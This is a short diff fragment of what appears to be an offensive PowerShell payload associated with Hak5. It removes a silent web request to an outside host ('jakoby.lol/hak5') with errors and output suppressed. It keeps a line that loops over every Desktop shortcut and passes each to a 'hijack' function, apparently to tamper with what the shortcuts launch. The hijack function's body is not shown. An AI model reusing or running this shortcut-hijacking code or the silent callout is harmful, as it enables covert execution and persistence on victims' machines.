@@ -114,5 +114,5 @@ if(Test-Path -Path "$Link" -PathType Leaf){Set-Shortcut -LinkPath "$Link" -IconL
 }
 
 #-----------------------------------------------------------------------------------------------------------
-iwr "https://jakoby.lol/hak5" -EA 0 >$null
+
 Get-ChildItem –Path "$Env:USERPROFILE\Desktop" -Filter *.lnk |Foreach-Object {$i = Get-Shortcut $_.FullName;hijack $_.FullName}
